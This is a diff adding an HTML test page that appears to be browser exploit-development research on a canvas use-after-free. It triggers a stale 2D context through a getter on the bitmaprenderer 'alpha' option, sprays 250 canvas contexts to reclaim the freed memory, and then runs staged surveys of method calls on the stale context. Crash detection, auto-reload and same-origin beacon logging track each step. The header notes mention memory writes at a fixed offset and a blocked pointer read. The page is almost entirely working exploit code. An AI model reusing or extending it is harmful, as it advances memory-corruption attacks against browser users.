@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<title>V923M - stale CTX method/property survey (valid 2D reclaim, crash-detected)</title>
+<style>
+  body { background:#0b0e14; color:#d7e0ea; font-family:ui-monospace,Menlo,monospace; padding:14px; }
+  h1 { color:#58a6ff; font-size:15px; margin:0 0 6px; }
+  p  { color:#8b949e; font-size:12px; margin:4px 0 10px; line-height:1.55; }
+  pre { font-size:12px; white-space:pre-wrap; }
+  code { color:#c9d1d9; background:#21262d; padding:1px 5px; border-radius:4px; }
+  .key { border-left:3px solid #39c5bb; padding-left:8px; }
+</style>
+</head>
+<body>
+<h1>V923M - 2D context method/property survey on stale CTX (valid reclaim)</h1>
+
+<p class="key">
+V923G–L: <code>roundRect</code> executes and writes <code>cairo_t*</code>@+48 on valid 2D reclaim; no leak/corruption
+observed; pointer read blocked (AB reclaim needs address/vptr-safe path). V923M surveys stale CTX calls/properties after
+<b>valid 2D reclaim</b> (safe vtable) in crash-detected groups to catalog behavior/survival and spot any unusual
+read/write side effects. (Note: valid same-type reclaim aliases a live context, so results reflect shared-object
+behavior.)
+</p>
+
+<pre id="out">starting...</pre>
+
+<script>
+'use strict';
+
+var SEEK = location.pathname;
+var RUN = 'r' + Date.now().toString(36) + '-' + Math.random().toString(36).slice(2, 7);
+
+function lsGet(k) { try { return window.localStorage.getItem('v923m_' + k); } catch (e) { return null; } }
+function lsSet(k, v) { try { window.localStorage.setItem('v923m_' + k, String(v)); } catch (e) {} }
+function lsDel(k) { try { window.localStorage.removeItem('v923m_' + k); } catch (e) {} }
+
+function bks(tag, body) {
+  var u = '/beacon/V923M-' + tag + '?d=' +
+          encodeURIComponent(String(body == null ? '' : body).slice(0, 460)) +
+          '&run=' + encodeURIComponent(RUN) + '&t=' + Date.now() + '&s=1';
+  try { var x = new XMLHttpRequest(); x.open('GET', u, false); x.send(null); }
+  catch (e) { try { var i = new Image(); i.src = u; } catch (e2) {} }
+}
+
+var O = document.getElementById('out');
+function say(s) { O.textContent += '\n' + s; }
+function errOf(e) { return e ? String(e.name || 'Error') + ':' + String(e.message || e).slice(0, 80) : 'none'; }
+function reloadSoon(ms) { setTimeout(function () { location.href = SEEK + '?op=auto&r=' + Date.now(); }, ms); }
+
+var CTX = null, HASRR = false, KEEP = null, AUXC = null, AUX = null;
+
+function trigger(canvas) {
+  var saved = null, hasRR = false;
+  var dict = {};
+  Object.defineProperty(dict, 'alpha', {
+    get: function () {
+      var ctx = canvas.getContext('2d');
+      if (!ctx) return true;
+      saved = ctx;
+      try { hasRR = (typeof ctx.roundRect === 'function'); } catch (e0) {}
+      try { ctx.lineWidth = 2; ctx.fillStyle = '#123456'; } catch (e) {}
+      return true;
+    }
+  });
+  try { canvas.getContext('bitmaprenderer', dict); } catch (e2) {}
+  return { saved: saved, hasRR: hasRR };
+}
+
+function spray2d(count) {
+  var keep = [];
+  for (var i = 0; i < count; i++) {
+    var c = document.createElement('canvas'); c.width = 8; c.height = 8;
+    var cx = null; try { cx = c.getContext('2d'); } catch (e) {}
+    if (cx) keep.push(cx);
+  }
+  KEEP = keep; return keep;
+}
+
+function triesOf() { var t = parseInt(lsGet('tries') || '0', 10); return isNaN(t) ? 0 : t; }
+function bumpTry() { var t = triesOf() + 1; lsSet('tries', t); return t; }
+
+var STAGES = ['path-basic','path-curves','rect-rr','transform','state-props','dash','draw','query','gradpat','text','image','reset'];
+function stageIdx(s) { for (var i = 0; i < STAGES.length; i++) if (STAGES[i] === s) return i; return 0; }
+function curStage() { return lsGet('stage') || STAGES[0]; }
+function advance(msg) {
+  var i = stageIdx(curStage());
+  if (i + 1 < STAGES.length) { lsSet('stage', STAGES[i + 1]); lsDel('tries'); bks('ADV', STAGES[i] + '->' + STAGES[i + 1] + (msg ? ',' + msg : '')); }
+  else { lsSet('phase', 'done'); bks('DONE', 'all stages done'); }
+}
+
+function step(tag, label, fn) {
+  var st = curStage(), t = bumpTry();
+  bks(tag + '-PRE', 'stage=' + st + ',try=' + t + ',' + label);
+  say(tag + ' ' + label);
+  lsSet('pending', st + ':' + tag);
+  var res, err = null; try { res = fn(); } catch (e) { err = e; }
+  lsDel('pending');
+  if (err) { bks(tag + '-ERR', 'stage=' + st + ',' + errOf(err)); return { ok: false, err: err }; }
+  bks(tag + '-OK', 'stage=' + st + (res !== undefined ? ',' + String(res).slice(0, 200) : ''));
+  return { ok: true, res: res };
+}
+
+function runOps(ops) {
+  var out = [];
+  for (var i = 0; i < ops.length; i++) {
+    var name = ops[i][0], fn = ops[i][1], v, e = null;
+    try { v = fn(); } catch (ex) { e = errOf(ex); }
+    out.push(name + ':' + (e ? 'ERR=' + e : ('OK' + (v !== undefined ? '=' + String(v).slice(0,40) : ''))));
+  }
+  return out.join(',');
+}
+
+function main() {
+  if (location.search.indexOf('reset=1') >= 0) { lsDel('pending'); lsDel('loads'); lsDel('phase'); lsDel('stage'); lsDel('tries'); bks('RESET', 'cleared'); say('reset'); return; }
+  var loads = parseInt(lsGet('loads') || '0', 10) + 1; lsSet('loads', loads);
+  if (loads > 200) { bks('GIVEUP', 'loads=' + loads); return; }
+
+  var pend = lsGet('pending');
+  if (pend) { lsDel('pending'); var t = triesOf(); bks('CRASH', 'pending=' + pend + ',try=' + t + ',load=' + loads); if (t >= 2) { bks('BLACKLIST', pend); advance('crashx2'); } reloadSoon(3500); return; }
+  if (lsGet('phase') === 'done') { bks('ALREADY', 'done'); say('done'); return; }
+
+  var st = curStage();
+  bks('BOOT', 'load=' + loads + ',stage=' + st);
+
+  var canvas = document.createElement('canvas'); canvas.width = 1; canvas.height = 1;
+  document.body.appendChild(canvas);
+  var tr = trigger(canvas);
+  if (!tr.saved) { bks('ERR', 'trigger-failed'); reloadSoon(3000); return; }
+  CTX = tr.saved; HASRR = tr.hasRR;
+  spray2d(250);
+  AUXC = document.createElement('canvas'); AUXC.width = 8; AUXC.height = 8; AUX = AUXC.getContext('2d');
+  bks('ARM', 'stage=' + st + ',rr=' + HASRR);
+
+  if (st === 'path-basic') {
+    var r = step('OPS', 'path-basic', function(){ return runOps([
+      ['beginPath', function(){ CTX.beginPath(); }],
+      ['moveTo', function(){ CTX.moveTo(1,1); }],
+      ['lineTo', function(){ CTX.lineTo(10,10); }],
+      ['closePath', function(){ CTX.closePath(); }],
+      ['beginPath2', function(){ CTX.beginPath(); }]
+    ]); }); bks('RES', r.ok?r.res:'ERR'); advance(); reloadSoon(3000); return;
+  }
+  if (st === 'path-curves') {
+    var r = step('OPS', 'path-curves', function(){ return runOps([
+      ['beginPath', function(){ CTX.beginPath(); CTX.moveTo(0,0); }],
+      ['arc', function(){ CTX.arc(10,10,5,0,Math.PI,false); }],
+      ['arcTo', function(){ CTX.moveTo(0,0); CTX.arcTo(10,0,10,10,5); }],
+      ['quad', function(){ CTX.quadraticCurveTo(5,5,10,0); }],
+      ['bezier', function(){ CTX.bezierCurveTo(1,2,3,4,5,6); }],
+      ['ellipse', function(){ if(CTX.ellipse) CTX.ellipse(10,10,5,3,0,0,6.28); else return 'na'; }]
+    ]); }); bks('RES', r.ok?r.res:'ERR'); advance(); reloadSoon(3000); return;
+  }
+  if (st === 'rect-rr') {
+    var r = step('OPS', 'rect-rr', function(){ return runOps([
+      ['rect', function(){ CTX.beginPath(); CTX.rect(1,1,10,10); }],
+      ['roundRect', function(){ if(HASRR){ CTX.beginPath(); CTX.roundRect(1,1,20,20,5); } else return 'na'; }],
+      ['roundRect4', function(){ if(HASRR){ CTX.beginPath(); CTX.roundRect(1,1,20,20,[1,2,3,4]); } else return 'na'; }]
+    ]); }); bks('RES', r.ok?r.res:'ERR'); advance(); reloadSoon(3000); return;
+  }
+  if (st === 'transform') {
+    var r = step('OPS', 'transform', function(){ return runOps([
+      ['setTransform', function(){ CTX.setTransform(1,0,0,1,0,0); }],
+      ['translate', function(){ CTX.translate(1,1); }],
+      ['scale', function(){ CTX.scale(1,1); }],
+      ['rotate', function(){ CTX.rotate(0); }],
+      ['getTransform', function(){ if(CTX.getTransform){ var m=CTX.getTransform(); return m&&m.a; } return 'na'; }],
+      ['resetTransform', function(){ if(CTX.resetTransform) CTX.resetTransform(); else return 'na'; }]
+    ]); }); bks('RES', r.ok?r.res:'ERR'); advance(); reloadSoon(3000); return;
+  }
+  if (st === 'state-props') {
+    var r = step('OPS', 'state-props', function(){ return runOps([
+      ['save', function(){ CTX.save(); }],
+      ['restore', function(){ CTX.restore(); }],
+      ['lineWidthSet', function(){ CTX.lineWidth = 5; }],
+      ['lineWidthGet', function(){ return CTX.lineWidth; }],
+      ['globalAlpha', function(){ CTX.globalAlpha = 0.5; return CTX.globalAlpha; }],
+      ['fillStyle', function(){ CTX.fillStyle = '#ff0000'; return CTX.fillStyle; }],
+      ['lineCap', function(){ CTX.lineCap = 'round'; return CTX.lineCap; }],
+      ['lineJoin', function(){ CTX.lineJoin = 'round'; return CTX.lineJoin; }],
+      ['miterLimit', function(){ CTX.miterLimit = 8; return CTX.miterLimit; }]
+    ]); }); bks('RES', r.ok?r.res:'ERR'); advance(); reloadSoon(3000); return;
+  }
+  if (st === 'dash') {
+    var r = step('OPS', 'dash', function(){ return runOps([
+      ['setLineDash', function(){ CTX.setLineDash([5,3]); }],
+      ['getLineDash', function(){ return (CTX.getLineDash()||[]).length; }],
+      ['lineDashOffset', function(){ CTX.lineDashOffset = 2; return CTX.lineDashOffset; }]
+    ]); }); bks('RES', r.ok?r.res:'ERR'); advance(); reloadSoon(3000); return;
+  }
+  if (st === 'draw') {
+    var r = step('OPS', 'draw', function(){ return runOps([
+      ['fillRect', function(){ CTX.fillRect(0,0,1,1); }],
+      ['strokeRect', function(){ CTX.strokeRect(0,0,1,1); }],
+      ['clearRect', function(){ CTX.clearRect(0,0,1,1); }],
+      ['fill', function(){ CTX.beginPath(); CTX.rect(0,0,5,5); CTX.fill(); }],
+      ['stroke', function(){ CTX.beginPath(); CTX.rect(0,0,5,5); CTX.stroke(); }],
+      ['clip', function(){ CTX.save(); CTX.beginPath(); CTX.rect(0,0,5,5); CTX.clip(); CTX.restore(); }]
+    ]); }); bks('RES', r.ok?r.res:'ERR'); advance(); reloadSoon(3000); return;
+  }
+  if (st === 'query') {
+    var r = step('OPS', 'query', function(){ return runOps([
+      ['isPointInPath', function(){ CTX.beginPath(); CTX.rect(0,0,10,10); return CTX.isPointInPath(5,5); }],
+      ['isPointInStroke', function(){ CTX.beginPath(); CTX.rect(0,0,10,10); return CTX.isPointInStroke(0,0); }],
+      ['getImageData', function(){ var id=CTX.getImageData(0,0,1,1); return id&&id.data&&id.data.length; }],
+      ['createImageData', function(){ var id=CTX.createImageData(2,2); return id&&id.width; }],
+      ['measureText', function(){ if(CTX.measureText) return Math.floor(CTX.measureText('a').width); return 'na'; }]
+    ]); }); bks('RES', r.ok?r.res:'ERR'); advance(); reloadSoon(3000); return;
+  }
+  if (st === 'gradpat') {
+    var r = step('OPS', 'gradpat', function(){ return runOps([
+      ['createLinearGradient', function(){ var g=CTX.createLinearGradient(0,0,10,10); g.addColorStop(0,'red'); g.addColorStop(1,'blue'); CTX.fillStyle=g; }],
+      ['createRadialGradient', function(){ var g=CTX.createRadialGradient(5,5,1,5,5,5); g.addColorStop(0,'red'); CTX.fillStyle=g; }],
+      ['createPattern', function(){ if(AUX){ try{ var p=CTX.createPattern(AUXC,'repeat'); return p?'ok':'null'; }catch(e){ return 'ERR'; } } return 'na'; }]
+    ]); }); bks('RES', r.ok?r.res:'ERR'); advance(); reloadSoon(3000); return;
+  }
+  if (st === 'text') {
+    var r = step('OPS', 'text', function(){ return runOps([
+      ['font', function(){ CTX.font='10px sans-serif'; return CTX.font; }],
+      ['textAlign', function(){ CTX.textAlign='left'; return CTX.textAlign; }],
+      ['fillText', function(){ CTX.fillText('A',0,10); }],
+      ['strokeText', function(){ CTX.strokeText('A',0,10); }]
+    ]); }); bks('RES', r.ok?r.res:'ERR'); advance(); reloadSoon(3000); return;
+  }
+  if (st === 'image') {
+    var r = step('OPS', 'image', function(){ return runOps([
+      ['drawImageCanvas', function(){ if(AUXC) CTX.drawImage(AUXC,0,0); else return 'na'; }],
+      ['putImageData', function(){ var id=CTX.createImageData(2,2); CTX.putImageData(id,0,0); }]
+    ]); }); bks('RES', r.ok?r.res:'ERR'); advance(); reloadSoon(3000); return;
+  }
+  if (st === 'reset') {
+    var r = step('OPS', 'reset/misc', function(){ return runOps([
+      ['canvasGetter', function(){ return CTX.canvas ? 'ok' : 'null'; }],
+      ['getContextAttributes', function(){ if(CTX.getContextAttributes) return JSON.stringify(CTX.getContextAttributes()).slice(0,60); return 'na'; }],
+      ['reset', function(){ if(CTX.reset) { CTX.reset(); return 'ok'; } return 'na'; }],
+      ['filter', function(){ try{ CTX.filter='none'; return CTX.filter; }catch(e){ return 'na'; } }],
+      ['direction', function(){ try{ CTX.direction='ltr'; return CTX.direction; }catch(e){ return 'na'; } }]
+    ]); }); bks('RES', r.ok?r.res:'ERR'); advance(); reloadSoon(3000); return;
+  }
+  advance('unknown'); reloadSoon(3000);
+}
+
+try { main(); } catch (e) { bks('FATAL', String(e && (e.message || e)).slice(0, 200)); }
+</script>
+</body>
+</html>
